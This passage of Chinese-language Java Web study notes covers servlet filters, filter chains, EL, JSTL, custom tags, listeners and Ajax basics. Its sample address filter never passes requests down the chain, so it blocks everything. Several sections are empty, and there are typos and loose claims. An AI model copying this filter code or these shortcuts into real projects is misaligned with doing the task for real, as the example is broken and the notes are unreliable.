		<filter-class>com.trilever.PreFilter</filter-class>
	</filter>
	<filter-mapping>
		//以下配置使得此Servlet对于两个Servlet都可自动调用。
		<filter-name>PreFilter</filter-name>
		<url-pattern>/xizhao</url-pattern>
		<url-pattern>/anmo</url-pattern>
	</filter-mapping>

如此，即将两个Servlet中的相同部分抽取到过滤器中进行自动调用(因为已经在Web.xml文件中进行配置)。

由前面可知，当我们的Servlet需要接收、处理客户端请求，就需要处理中文乱码的问题。对于很多Servlet都需要这一操作，那么就可以将中文乱码处理部分进行抽取，作为一个中文乱码处理过滤器。然后在Web.xml中配置对于所有的Servlet都适用。就可以解决所有的Servlet的中文乱码问题。  

注意：在Filter中的init()方法的参数FilterConfig可以用于从Web.xml文件中读取我们预先设置的数据，这些数据可以是整个项目的配置信息，当需要修改的时候，可以很方便地在Web.xml中修改。在全局的Servlet都可以读取使用。见前面的ServletConfig部分的介绍。Filter中init()方法的参数FilterConfig见图`FilterConfig.PNG`所示：

##Java Web中过滤器链
所谓的过滤器链：就是存在多个过滤器，一起发挥作用。过滤器既可以过滤Servlet也可以过滤JSP。  
那么各个过滤器执行流程是怎么样的？  
Answer:前过滤器执行顺序(也就是doFilter()方法之前的代码)是依据Web.xml中的mapping顺序确定的。当其中一个过滤器中的前过滤器执行完之后，如果其后面还有过滤器那就先执行其后面的过滤器的前过滤器部分，如果后面没有过滤器，那就执行Servlet中的部分。执行完Servlet之后，再转向过滤器中的后过滤器部分，当然，各个后过滤器部分的执行顺序与前过滤器部分的顺序相反。执行流程见图`Filter_Chain_Process.PNG`所示：


###在过滤器联众使用适配器模式
在实际使用中，过滤器中的init()方法与destory()方法往往是没有用的，只需要进行空实现即可。但是当要大量使用过滤器的时候，太多的空实现就会导致代码冗余。此时就可以使用适配器模式予以解决。先创建过滤器适配器，对Filter类进行空实现。然后所有的过滤器都继承自这个适配器即可不必实现全部的方法。

注意：字符串处理方法split()，如果是用"."进行分割，必须写成"\\."才可以。
前面我们做了一个用于处理中文乱码的过滤器，现在创建一个客户端地址过滤器，就是限制某些地址访问我们的Servlet。  
地址过滤器使用示例：  
>
	public class RemoteAddressFilter extends FilterAdapter 
	{
		@Override
		public void doFilter(ServletRequest request, ServletResponse response,
				FilterChain chain) throws IOException, ServletException
		{
			String addr = request.getRemoteAddr();
			String[] strArray = addr.split("\\.");
			int lastindex = Integer.parseInt(strArray[3]);
			if(lastindex>10&&lastindex<50)
				response.getWriter().println("you are not authorized to this page");
		}
	}

还有客户端登陆账号过滤器示例：  

网站log修改过滤器示例：  


##AOP-面向方面编程
什么叫做方面：例如我们的代码需要解决中文乱码的问题。那么这个问题就是一个方面。  
我们将处理中文乱码的那部分代码提取出来，构成一个过滤器，这就是面向方面编程，称为`AOP`。也叫面向切面编程。就好像过滤器一样，每一个过滤器都像在请求传递到`Servlet/JSP`之前的路上的切面，将必要的东西予以过滤、切除。称之为面向切面编程。  
过滤器、拦截器(后面Structs2再讲)的作用就是：让后面的`Servlet/JSP`负责他们自己的工作，只做他们自己的工作即可。其他的工作由过滤器、拦截器这些东西完成。

#Java Web中的EL
Expression Language:表达式语言。在JSP页面中使用。   
以前是JSTL(JSP标准标签库)的一部分。  
现在JSF也将其纳入。  
EL的作用:主要是用于输出显示值(见下面的例子)。与JSTL组合代替JSP页面中的脚本元素与动作元素。  
语法:${EL语言}  

##EL的隐式对象
param:作用相当于request.getParameters(),如、获得form中的textArea返回的值，textArea只返回一个单值。  
paramValues:作用相当于request.getParameterValues(),如、获得form中的checkBox返回的值，checkBox返可以回多个值。  
以上，param、paramValues与request的区别在于，如果获得的是null，那么param会显示出空白，而request会显示出null。
注意：这两个隐式对象只在模型1中才使用。在模型2中没有使用。此二者无需研究。
示例：  
>
	${param.name}//返回form中的textArea中的name值。
	${param.pwd}//返回form中的textArea中的pwd值。
	
${pageScope.username}:取出page范围内的username变量。  
${requestScope.username}:取出requestScope范围内的username变量。  
${sessionScope.username}:取出sessionScope范围内的username变量。  
${applicationScope.username}:取出applicationScope范围内的username变量。  

原来设置page、request、session、application范围内的某个变量值：
>
	pageContext.setAttribute("pagename","pagevalue")；
	request.setAttribute("requestname","requestvalue");
	session.setAttribute("sessionname","sessionvalue");
	application.setAttribute("applicationname","applicationvalue");

获取page、request、session、application范围内的某个变量值：
>
	pageContext.getAttribute("pagename")；
	request.getAttribute("requestname");
	session.getAttribute("sessionname");
	application.getAttribute("applicationname");
	
以上使用get方法从变量中取值，相当于以下使用EL中的Scope隐式变量：  
>
	${pageScope.pagename}//取出page范围内的pagename变量。  
	${requestScope.requestname}//取出requestScope范围内的requestname变量。  
	${sessionScope.sessionname}//取出sessionScope范围内的sessionname变量。  
	${applicationScope.applicationname}//取出applicationScope范围内的applicationname变量。

使用EL的优点时可以节省代码。  
注意：当我们在创建一个实体类的时候，前3个字母都不要大写，否则在Structs里面会出现问题。

对于一个实体类而言(如，Student类)，EL的用法还包括：  
>
	${requestScope.mStudent.name}//取出requestScope范围内的mStudent变量的Student对象的name成员变量值。  

甚至当Student类中包括了birth类成员变量，birth类包括year、month、day成员变量，还可以使用：  
>
	${requestScope.mStudent.birth.year}//取出requestScope范围内的mStudent变量的Student对象的birth成员变量的year成员变量值。  
	
甚至还有用法如下：  
>
	${mStudent.birth.year}//取出requestScope范围内的mStudent变量的Student对象的birth成员变量的year成员变量值。这里我们没有指定requesScope这个范围，会自动从pageScope向applicationScope范围进行对这个对象的查找。也就是说，如果在pageScope范围内就有mStudent这个变量，那么在pageScope中查找到即停止查找，不再向下继续查找。  
以上这种用法这就是EL的功能强大之处，实际上调用的都是get方法。


关于4个Scope隐式对象的，如图`Points_Scope_Objects.PNG`所示：

EL中还有一个隐式对象pageContext。其包含本页面的所有信息，如、request对象、Session对象。通过其拥有的request对象就可以获得ServletPath变量值等。

EL中的重点就是这个4个Scope隐式对象、1个pageContext隐式对象与param与paramValues隐式对象。后二者是为模型1服务的，所以使用少。重点是前面四个Scope。

##EL中的运算符
与Java中的运算符没有什么区别。差不多的。

##EL在实际中的应用
以后再实际中就不要使用request.getParameter()这样的代码了，可以全部使用EL代码予以代替。


#Java Web中的JSTL
JSTL的重要作用就是完成流程控制。与EL配合代替JSP中的脚本元素与动作元素。  

JSTL:JavaSever Pages Standard Tag Library  
JSP标准标签函数库。  
包括：
核心标签库、I18N格式标签库、SQL标签库、XML标签库、函数标签库。  
重点掌握的是核心标签库。其他的都几乎不用。  
JSTL与EL一样，都是用在JSP页面中。  
JSP中的指令元素(见图`Instruction_Elements.PNG`所示)中有一个taglib元素，示例:  

JSTL中的**重点**是：各种流程控制语句如foreach、if、while等。语法见电子书。  

实际上，无论是EL还是JSTL，其实际上都是JSP的一种子语言而已，目的是为了满足一定的任务与作用，例如，EL的作用就是为了显示、输出变量的值，而JSTL是为了提供流程控制语句。其作用也和Java中相应部分的作用是一样的。都是JSP中的一部分。就好比JSP也是一种语言一样。  
EL与JSTL的作用就是代替JSP中的脚本元素与动作元素。所以，我们应该将JSP文件中的所有的脚本元素与动作元素(当然指令元素师不能换的)换成EL、JSTL语句才好。JSP中的这两种元素都可以使用EL与JSTL予以代替。


注意：不要误以为Session、request这些里面只能放少量的数据，其可以放任何的数据，而且可以传递。例如，就可以再request里面放一个map或者list，再请求转发出去，在另外一个页面中进行使用。都是可以的。

#Java Web中的自定义标记
标记示例：  
>
	<jsp:include page="index.jsp">  
		<jsp:param value="zhangshan" name="name"/>
	</jsp:include>
	
jsp：include，此称为标记，jsp是标记的前缀，include是标记的后缀。中间一冒号分割。  
page:标记的属性，index.jsp是属性值。  
<jsp:param>称为<jsp:include>的子标记。  

##自定义标记
开发自定义标记的目的：借助自定义标记对应的java类(标记处理器)完成某些功能，完成jsp页面的开发。  
其优点是：有助于模块化编程，提高程序的可复用性等。  
自定义标记的组成：
1. 自定义标记。例：<wt:hello></wt:hello>  
2. 标记处理器。就是一个java类，当容器解析运行标记<wt:hello></wt:hello>时，会自动调用java类的相关方法，完成某项功能。  
3. 标记描述符。是一个后缀为tld但文档内容格式为xml的文件，它完成一个自定义标记到标记处理器java类的绑定过程。

##标签处理器
标签处理器：就是创建一个类，其继承自BodyTageSupport或者TagSupport。  
其实现了两个方法，doStartTag()、doEndTag()。当容器遇到开始标记<wt:hello>时，就会执行doStartTag()方法，当容器遇到结束标记</wt:hello>时，就会执行doEndTag()方法。

##标记描述符
创建一个tld文件。其实际上是一个xml文件，其内部将我们的自定义标记的名称与我们创建的标签处理器对应起来。以后当我们直接使用自定义标记的名称的时候，会通过这个tld文件找到对应的标签处理器，运行其里面的doStartTag()方法与doEndTag()方法。  
注：这个文件必须放在Web-inf目录或其子目录之下。  
##在JSP中使用自定义标记
在jsp中使用时，要先导入标签库。使用taglib动作  
>	
	<%@ taglib prefix="wt" uri="http://trilever.com" %>
	
使用时，再jsp文件中写了这个标签就会自动调用标签处理器中的方法。

注：自定义标记的作用：就相当于一个宏一样，通过一个标记来调用与之对应的两个方法。这样就可以实现模块化编程。将JSP中的代码抽取出来，放入在模块(标记处理器中的两个方法)之中。  
所谓的JSTL就是Sun公司给我们开发供我们使用的标签库。我们不用对里面的标签进行自定义，而是可以直接使用。Sun公司已经将这个标签库(核心标签库)里面的标签所对应的标签处理器都写好了(放在JSTL的jar包里面)。我们直接使用JSTL标签即可。这就是为什么我们要使用JSTL时必须要倒入JSTL的jar包，因为这个jar包里包含了这个标签库里的标签所对应的tld文件，该文件里面的就是JSTL标签所对应的标签处理器。


#Java Web中的监听器
所谓的监听器就是：当我们想在application、session、request这三个对象创建、消亡或者向其中添加、删除、修改Attribute的时候执行某些代码，就使用监听器来完成。这就是监听器的作用，监听这三个对象的变化。  
##监听器的分类
1. ServletContextAttributeListener:监听对application的Attribute的操作，如、增加、删除、修改等操作。  
2. ServletContextListener:监听application对象的创建与消亡。  
3. 


##使用监听器步骤
1. 实现以上的那些监听器接口。实现里面的方法  
对于监听创建与消亡的监听器，需要实现init()与的destory()方法。  
对于监听Attribute的监听器，需要实现attributeAdded()、attributeRemoved()、attributeReplaced()方法。  
2. 在Web.xml中对这个监听器进行相应的注册配置。  

#Ajax
Web1.0：内容贡献者提供内容，其他人阅读内容。不是所有人都能提供内容，进行互动。就好比我们的网上商城项目，就是一个Web1.0项目。  
Web2.0：让用户来贡献内容，任何人都可以贡献内容。如、博客就是Web2.0产品。支持RSS订阅功能。社会化网络。新的交互方式例如自动补全。  

Location对象可以用于当前页面的跳转。将该对象改成什么地址变量，当前页面就跳向什么地址变量。  

##Web1.0与Web2.0技术上的对比
此处见图所示：  

使用Web1.0技术，会有一个缺陷：只能保存客户请求发出前的那些信息。当客户发出请求之后到得到服务器端回应这段时间内(由于网络传输的网速问题，从发出请求到服务器端作出回应之间一定是有一个时间间隔的)，客户作出的任何操作都是无效的。这样就导致在用户操作体验上是间断而不是连续的。也就是说，在服务器端的响应完毕之前，客户端用户的一切操作都是无用的，用户只能处于等待状态，交互极其不连贯。交互体验差，就像和机器对话一样。  
Web1.0中提供的是完全刷新，也就是说，当服务器端作出的回应反映在客户端浏览器上是，是整个页面的刷新、重写。  
而Ajax为Web2.0提供了局部刷新，也就是说服务器端的回馈只对浏览器的局部进行刷新。其在网络传输上具有异步传输功能(免去用户等待服务器回应的缺点，提高交互水平)。  
由于Web1.0是完全刷新，所以导致在网络带宽上需要更多的资源。  

#富客户端
富客户端技术有:Ajax,Flex,JavaFX。  
客户端分以下几种：  
C/S：分为胖客户端、瘦客户端。我们的TMS就是胖客户端，其客户端代码中有界面代码，也有核心业务逻辑代码。所谓的瘦客户端就是将核心业务代码放在一个服务器中，在客户端只有界面代码，其有一个中间件服务器。  
B/S：分为0客户端、富客户端。如网上商城项目就是0客户端，其界面代码即可以操作核心业务代码，也可以直接操作数据库。而浏览器客户端值用解析界面代码。

Ajax：Asysnomous+JavaScript++XML  
*JavaScript的功能很强大*：可以调用ActiveXObject控件(就是一种COM组件)，借助这些组件以完成非常强大的功能。JS本身的功能不强。  
所谓的COM组件(技术)的思想：就是说，无论用什么语言写了一个类(一个组件)，只要将这个类在计算机的注册表中予以注册，就能在任何地方调用这个组件。  
例如：用C++语言写了一个类，在注册表中进行了注册，那么在其他java程序中，就可以通过注册表中的信息去加载这个类。  
所以，由上，JS有一个非常强大的功能，就是可以调用COM组件，实现很多强大的功能。

所以，加入用其他语言写一个病毒程序，在注册表中注册了。那么可以使用JS去调用这个组件。激活病毒。


##Ajax工作原理
在AJax技术中，客户端浏览器与服务器之间不是直接发送请求的，而是通过中间的一个控件。  
Ajax代码实际上就是JS代码，都是写在JSP文件中的JS代码。
我们要使用Ajax，步骤如下：  
1. 就需要创建一个XMLHttpRequest对象。根据不同的浏览器核心，使用不同的代码创建该对象。如图所示：  
2. 设置回调函数。什么叫回调函数？当服务器端返回了结果之后，需要告诉客户端返回结果已经到达，这就是回调函数的作用，服务器通知客户端返回结果已经到达。  
3. 初始化xmlHttpRequest组件。设置url、请求方式、是否异步这些属性。  
4. 发送请求。

这个组件的作用是负责与服务器的交互。  
该组件的状态也就是：XMLHttpRequest.readyState。有下面几个值：0(未初始化)、1(初始化)、2(发送请求)、3(开始接受结果，也就是开始接受服务器返回结果，返回结果就是一个字符串，就是HTML文档)、4(接受结果完毕)。  
XMLHttpRequest状态发生一次改变，就调用一次回调函数。


##Ajax技术与一般技术的比较
见图所示：
